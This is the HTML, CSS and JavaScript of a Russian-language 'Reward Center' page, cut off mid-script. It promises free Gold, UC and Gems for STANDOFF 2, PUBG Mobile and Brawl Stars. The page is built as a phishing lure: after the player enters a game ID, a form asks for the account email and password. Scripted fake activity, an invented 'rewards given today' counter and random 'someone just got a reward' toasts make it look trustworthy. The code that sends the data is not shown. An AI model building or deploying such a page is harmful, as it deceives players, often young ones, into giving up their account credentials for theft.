<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reward Center — Получение наград</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    html, body { height: 100%; overflow: hidden; }
    
    body {
        background: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 60%, #020617 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
        color: #e2e8f0;
        position: relative;
    }

    .bg-particles {
        position: fixed;
        inset: 0;
        overflow: hidden;
        z-index: 0;
        pointer-events: none;
    }
    .particle {
        position: absolute;
        border-radius: 50%;
        background: rgba(16, 185, 129, 0.15);
        filter: blur(40px);
        animation: float 20s infinite ease-in-out;
    }
    .particle:nth-child(1) { width: 300px; height: 300px; top: -100px; left: -100px; animation-delay: 0s; }
    .particle:nth-child(2) { width: 400px; height: 400px; bottom: -150px; right: -150px; background: rgba(59, 130, 246, 0.1); animation-delay: -5s; }
    .particle:nth-child(3) { width: 250px; height: 250px; top: 40%; left: 60%; background: rgba(139, 92, 246, 0.1); animation-delay: -10s; }
    @keyframes float {
        0%, 100% { transform: translate(0, 0) scale(1); }
        33% { transform: translate(40px, -30px) scale(1.1); }
        66% { transform: translate(-30px, 20px) scale(0.95); }
    }

    .container {
        background: rgba(30, 41, 59, 0.75);
        backdrop-filter: blur(24px);
        -webkit-backdrop-filter: blur(24px);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 24px;
        padding: 0;
        max-width: 440px;
        width: 100%;
        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 80px rgba(16, 185, 129, 0.05);
        overflow: hidden;
        position: relative;
        z-index: 1;
        animation: fadeInUp 0.6s ease;
    }
    @keyframes fadeInUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .progress-bar {
        height: 4px;
        background: rgba(255,255,255,0.05);
        width: 100%;
    }
    .progress-fill {
        height: 100%;
        width: 33%;
        background: linear-gradient(90deg, #10b981, #34d399);
        box-shadow: 0 0 12px rgba(16, 185, 129, 0.6);
        transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        border-radius: 0 4px 4px 0;
    }

    .inner-content { padding: 28px 26px; }
    
    .header { text-align: center; margin-bottom: 24px; }
    .logo-icon {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 56px;
        height: 56px;
        background: linear-gradient(135deg, #10b981, #059669);
        border-radius: 16px;
        margin-bottom: 14px;
        font-size: 28px;
        box-shadow: 0 8px 24px rgba(16, 185, 129, 0.35);
        animation: pulse-glow 2.5s infinite;
    }
    @keyframes pulse-glow {
        0%, 100% { box-shadow: 0 8px 24px rgba(16, 185, 129, 0.35); }
        50% { box-shadow: 0 8px 32px rgba(16, 185, 129, 0.6); }
    }
    h1 {
        font-size: 20px;
        font-weight: 700;
        color: #ffffff;
        margin-bottom: 6px;
        letter-spacing: -0.3px;
    }
    .sub { font-size: 13px; color: #94a3b8; line-height: 1.4; }

    .trust-counter {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        margin-top: 10px;
        font-size: 12px;
        color: #64748b;
    }
    .trust-counter .dot {
        width: 6px;
        height: 6px;
        border-radius: 50%;
        background: #10b981;
        box-shadow: 0 0 8px #10b981;
        animation: blink 1.5s infinite;
    }
    @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.3; }
    }
    .trust-counter span:last-child { color: #94a3b8; }
    #trustCount { color: #10b981; font-weight: 700; }
    
    .buttons {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-bottom: 20px;
    }
    
    .btn {
        display: flex;
        align-items: center;
        width: 100%;
        padding: 14px 16px;
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 14px;
        background: rgba(255, 255, 255, 0.03);
        cursor: pointer;
        transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        text-align: left;
        color: #e2e8f0;
        position: relative;
        overflow: hidden;
    }
    .btn::before {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(90deg, transparent, rgba(16, 185, 129, 0.15), transparent);
        transform: translateX(-100%);
        transition: transform 0.5s;
    }
    .btn:hover::before { transform: translateX(100%); }
    .btn:hover {
        background: rgba(255, 255, 255, 0.07);
        border-color: rgba(16, 185, 129, 0.5);
        transform: translateX(6px);
        box-shadow: -4px 0 20px rgba(16, 185, 129, 0.2);
    }
    .btn:active { transform: translateX(2px) scale(0.98); }
    
    .btn .icon {
        width: 44px;
        height: 44px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 12px;
        font-size: 22px;
        margin-right: 14px;
        flex-shrink: 0;
        transition: transform 0.25s;
    }
    .btn:hover .icon { transform: scale(1.1) rotate(-5deg); }

    .btn[data-game="standoff"] .icon { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
    .btn[data-game="pubg"] .icon { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
    .btn[data-game="brawl"] .icon { background: rgba(139, 92, 246, 0.15); color: #8b5cf6; }
    
    .btn-text { flex-grow: 1; }
    .btn-text .platform-name {
        display: block;
        font-size: 15px;
        font-weight: 600;
        color: #ffffff;
        margin-bottom: 2px;
    }
    .btn-text .platform-reward {
        display: block;
        font-size: 12px;
        color: #94a3b8;
        font-weight: 400;
    }
    
    .btn .arrow {
        color: #64748b;
        font-size: 20px;
        transition: transform 0.25s, color 0.25s;
    }
    .btn:hover .arrow { transform: translateX(4px); color: #10b981; }

    .step { display: none; flex-direction: column; gap: 14px; }
    .step.active { display: flex; animation: slideIn 0.4s ease; }
    @keyframes slideIn {
        from { opacity: 0; transform: translateX(20px); }
        to { opacity: 1; transform: translateX(0); }
    }
    .step h2 { font-size: 16px; font-weight: 600; color: #ffffff; margin-bottom: 4px; text-align: center; }
    
    input {
        width: 100%;
        padding: 14px 16px;
        border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        background: rgba(15, 23, 42, 0.6);
        color: #ffffff;
        font-size: 15px;
        outline: none;
        transition: all 0.25s;
    }
    input:focus {
        border-color: #10b981;
        box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.15);
        background: rgba(15, 23, 42, 0.9);
    }
    input.valid {
        border-color: #10b981;
        box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.2);
    }
    input::placeholder { color: #64748b; }
    
    .hint { font-size: 12px; color: #64748b; text-align: center; margin-top: -4px; }
    .error { color: #ef4444; font-size: 13px; display: none; text-align: center; margin-top: 4px; }
    .error.active { display: block; animation: shake 0.4s; }
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-6px); }
        75% { transform: translateX(6px); }
    }
    
    .submit {
        width: 100%;
        padding: 15px;
        border: none;
        border-radius: 12px;
        background: linear-gradient(135deg, #10b981, #059669);
        color: #ffffff;
        font-weight: 700;
        font-size: 15px;
        cursor: pointer;
        transition: all 0.25s;
        margin-top: 6px;
        box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
        letter-spacing: 0.3px;
        position: relative;
        overflow: hidden;
    }
    .submit::after {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        width: 5px;
        height: 5px;
        background: rgba(255,255,255,0.5);
        opacity: 0;
        border-radius: 50%;
        transform: scale(1);
        transition: all 0.6s;
    }
    .submit:active::after { transform: scale(50); opacity: 0; }
    .submit:hover { 
        background: linear-gradient(135deg, #34d399, #10b981);
        box-shadow: 0 8px 25px rgba(16, 185, 129, 0.5);
        transform: translateY(-2px);
    }
    .submit:active { transform: translateY(0) scale(0.98); }

    .back-btn {
        background: transparent;
        border: none;
        color: #64748b;
        font-size: 13px;
        cursor: pointer;
        padding: 8px;
        margin-top: 4px;
        transition: color 0.2s;
    }
    .back-btn:hover { color: #94a3b8; }

    .success {
        display: none;
        flex-direction: column;
        align-items: center;
        gap: 10px;
        text-align: center;
        padding: 10px 0;
    }
    .success.active { display: flex; }
    .checkmark {
        width: 72px;
        height: 72px;
        border-radius: 50%;
        background: rgba(16, 185, 129, 0.15);
        color: #10b981;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 36px;
        margin-bottom: 8px;
        animation: pop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        border: 2px solid rgba(16, 185, 129, 0.3);
        box-shadow: 0 0 30px rgba(16, 185, 129, 0.4);
    }
    @keyframes pop {
        0% { transform: scale(0); opacity: 0; }
        70% { transform: scale(1.15); }
        100% { transform: scale(1); opacity: 1; }
    }
    .success h2 { color: #10b981; font-size: 20px; font-weight: 700; }
    .success p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
    .success .note { font-size: 12px; color: #64748b; margin-top: 8px; }

    .footer {
        text-align: center;
        font-size: 11px;
        color: #475569;
        padding: 14px 26px 20px;
        border-top: 1px solid rgba(255,255,255,0.05);
        background: rgba(15, 23, 42, 0.3);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
    }
    .footer .lock { color: #10b981; }

    .toast {
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%) translateY(100px);
        background: rgba(16, 185, 129, 0.95);
        color: #fff;
        padding: 10px 18px;
        border-radius: 12px;
        font-size: 13px;
        font-weight: 600;
        box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
        opacity: 0;
        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        z-index: 100;
        white-space: nowrap;
    }
    .toast.show {
        transform: translateX(-50%) translateY(0);
        opacity: 1;
    }
</style>
</head>
<body>

<div class="bg-particles">
    <div class="particle"></div>
    <div class="particle"></div>
    <div class="particle"></div>
</div>

<div class="container">
    <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
    </div>

    <div class="inner-content">
        <div class="header" id="header">
            <div class="logo-icon">🎁</div>
            <h1>Reward Center</h1>
            <p class="sub">Выберите платформу для получения награды</p>
            
            <div class="trust-counter">
                <div class="dot"></div>
                <span><span id="trustCount">13492</span> наград выдано сегодня</span>
            </div>
        </div>

        <div class="buttons" id="buttons">
            <button class="btn" data-game="standoff" onclick="selectPlatform('STANDOFF 2', 'Gold')">
                <div class="icon">🪙</div>
                <div class="btn-text">
                    <span class="platform-name">STANDOFF 2</span>
                    <span class="platform-reward">Награда: Gold</span>
                </div>
                <div class="arrow">›</div>
            </button>
            
            <button class="btn" data-game="pubg" onclick="selectPlatform('PUBG Mobile', 'UC')">
                <div class="icon">💰</div>
                <div class="btn-text">
                    <span class="platform-name">PUBG Mobile</span>
                    <span class="platform-reward">Награда: UC</span>
                </div>
                <div class="arrow">›</div>
            </button>
            
            <button class="btn" data-game="brawl" onclick="selectPlatform('Brawl Stars', 'Gems')">
                <div class="icon">💎</div>
                <div class="btn-text">
                    <span class="platform-name">Brawl Stars</span>
                    <span class="platform-reward">Награда: Gems</span>
                </div>
                <div class="arrow">›</div>
            </button>
        </div>

        <div class="step" id="idStep">
            <h2 id="idTitle">Введите игровой ID</h2>
            <input type="text" id="gameId" placeholder="ID" oninput="liveValidate()">
            <p class="hint" id="idHint"></p>
            <p class="error" id="idError">Неверный формат ID</p>
            <button class="submit" onclick="checkId()">Продолжить</button>
            <button class="back-btn" onclick="goBack()">← Назад к выбору платформы</button>
        </div>

        <form class="step" id="loginStep" onsubmit="return sendData(event)">
            <h2 id="formTitle">Получение награды</h2>
            <input type="email" id="email" placeholder="Электронная почта" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" class="submit">Получить 🎁</button>
            <button type="button" class="back-btn" onclick="goBackToId()">← Назад</button>
        </form>

        <div class="success" id="success">
            <div class="checkmark">✓</div>
            <h2>Подарок получен!</h2>
            <p id="successText">Ваша награда зачислена на аккаунт.</p>
            <p class="note">Зайдите в игру и проверьте инвентарь</p>
        </div>
    </div>

    <div class="footer">
        <span class="lock">🔒</span>
        <span>Безопасная выдача наград</span>
    </div>
</div>

<div class="toast" id="toast">✅ Награда выдана!</div>

<script>
    let selected = { platform: '', reward: '' };
    let currentCount = 13492;
    let targetCount = 13492;

    // === Счетчик ===
    function animateCounterTo(target) {
        const el = document.getElementById('trustCount');
        const start = currentCount;
        const diff = target - start;
        const duration = 1200;
        const startTime = performance.now();

        function update(now) {
            const elapsed = now - startTime;
            const progress = Math.min(elapsed / duration, 1);
            const eased = 1 - Math.pow(1 - progress, 3);
            const value = Math.floor(start + diff * eased);
            el.textContent = value.toLocaleString('ru-RU');
            
            if (progress < 1) {
                requestAnimationFrame(update);
            } else {
                el.textContent = target.toLocaleString('ru-RU');
                currentCount = target;
            }
        }
        requestAnimationFrame(update);
    }

    function incrementCounter(amount) {
        targetCount += amount;
        animateCounterTo(targetCount);
    }

    function showToast(message) {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 2500);
    }

    // === Имитация активности ===
    function simulateActivity() {
        const delay = 8000 + Math.random() * 15000;
        setTimeout(() => {
            if (!document.getElementById('success').classList.contains('active')) {
                const amount = Math.floor(Math.random() * 2) + 1;
                incrementCounter(amount);
                showToast('✅ Кто-то только что получил награду!');
            }
            simulateActivity();
        }, delay);
    }

    // Запускаем всё после загрузки DOM
    window.addEventListener('DOMContentLoaded', function() {
        // Стартуем с 13492
        document.getElementById('trustCount').textContent = '13 492';
        targetCount = 13492;
        currentCount = 13492;
        
        // Небольшая анимация при загрузке (до 13495)
        setTimeout(() => {
            incrementCounter(3);
        }, 500);
        
        simulateActivity();
    });

    function updateProgress(percent) {
        document.getElementById('progressFill').style.width = percent + '%';
    }

    function selectPlatform(platform, reward) {
        selected.platform = platform;
        selected.reward = reward;

        document.getElementById('buttons').style.display = 'none';
        document.getElementById('header').style.display = 'none';
        document.getElementById('idTitle').textContent = 'Введите ID · ' + platform;
        updateProgress(66);

        let hint = '';
        let placeholder = '';

        if (platform === 'STANDOFF 2') {
            hint = 'ID должен состоять из 9 цифр';
            placeholder = '123456789';
        } else if (platform === 'PUBG Mobile') {
            hint = 'ID должен состоять из 8–12 цифр';
            placeholder = '5123456789';
        } else if (platform === 'Brawl Stars') {
            hint = 'ID должен начинаться с # и содержать 9 символов';
            placeholder = '#ABC123XYZ';
        }

        document.getElementById('idHint').textContent = hint;
        document.getElementById('gameId').placeholder = placeholder;
        document.getElementById('gameId').value = '';
        document.getElementById('gameId').classList.remove('valid');
        document.getElementById('idError').classList.remove('active');
        document.getElementById('idStep').classList.add('active');
    }

    function goBack() {
        document.getElementById('idStep').classList.remove('active');
        document.getElementById('buttons').style.display = 'flex';
        document.getElementById('header').style.display = 'block';
        updateProgress(33);
    }

    function goBackToId() {
        document.getElementById('loginStep').classList.remove('active');
        document.getElementById('idStep').classList.add('active');
        updateProgress(66);
    }

    function liveValidate() {
        const id = document.getElementById('gameId').value.trim();
        const input = document.getElementById('gameId');
        let valid = false;

        if (selected.platform === 'STANDOFF 2') valid = /^\d{9}$/.test(id);
        else if (selected.platform === 'PUBG Mobile') valid = /^\d{8,12}$/.test(id);
        else if (selected.platform === 'Brawl Stars') valid = /^#[A-Za-z0-9]{9}$/.test(id);

        if (valid) input.classList.add('valid');
        else input.classList.remove('valid');
    }

    function checkId() {
        const id = document.getElementById('gameId').value.trim();
        const err = document.getElementById('idError');
        let valid = false;

        if (selected.platform === 'STANDOFF 2') valid = /^\d{9}$/.test(id);
        else if (selected.platform === 'PUBG Mobile') valid = /^\d{8,12}$/.test(id);
        else if (selected.platform === 'Brawl Stars') valid = /^#[A-Za-z0-9]{9}$/.test(id);

        if (!valid) {
            err.textContent = 'Неверный формат. ' + document.getElementById('idHint').textContent;
            er
